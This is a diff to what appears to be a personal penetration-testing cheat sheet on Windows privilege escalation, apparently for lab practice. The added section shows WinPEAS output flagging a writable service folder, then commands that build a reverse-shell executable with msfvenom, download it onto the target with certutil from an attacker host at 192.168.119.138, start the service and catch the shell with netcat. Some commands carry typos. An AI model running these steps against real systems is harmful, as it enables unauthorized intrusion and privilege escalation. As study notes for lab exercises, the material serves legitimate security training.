@@ -1674,6 +1674,20 @@ C:\Windows\system32>whoami
 whoami
 james\administrator
 ````
+### Service Information Binary Exploitation
+#### Winpeas
+````
+auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload
+File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
+Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
+````
+#### Exploitation
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=443 -f exe -o auditTracker.exe
+*Evil-WinRM* PS C:\DevelopmentExecutables> cerutil -urlcache -split -f http://192.168.119.138:80/auditTracker.exe
+*Evil-WinRM* PS C:\DevelopmentExecutables>sc.exe start audtiTracker
+nc -nlvp 443
+````
 ### Leveraging Unquoted Service Paths
 Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.
 
@@ -1717,8 +1731,8 @@ sc qc "Some vulnerable service" #if the above failed check the privledges above 
 whoami /priv #if the above failed check to see if you have shutdown privledges
 shutdown /r /t 0 #wait for a shell to comeback
 ````
-#### Powershell
-#### Enumeration
+#### Powershell service priv esc
+##### Enumeration
 ````
 https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
 ````
